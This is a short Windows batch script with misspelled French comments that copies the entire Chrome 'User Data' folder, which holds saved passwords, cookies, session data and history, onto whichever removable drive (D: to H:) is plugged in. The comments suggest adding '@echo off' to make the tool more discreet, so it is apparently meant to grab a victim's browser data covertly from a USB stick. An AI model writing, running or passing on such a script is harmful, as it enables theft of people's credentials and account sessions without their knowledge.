##il est preferable de ne pas acjouter @echo off, affin de pouvoir tout ereur,
##mais si vous voulai rendre le logiciel plus discret, rajouter,
##@echo oof
color a
cls
Xcopy "%localappdata%\Google\Chrome\User Data" F:\data
Xcopy "%localappdata%\Google\Chrome\User Data" E:\data
Xcopy "%localappdata%\Google\Chrome\User Data" G:\data
Xcopy "%localappdata%\Google\Chrome\User Data" D:\data
Xcopy "%localappdata%\Google\Chrome\User Data" H:\data
exit
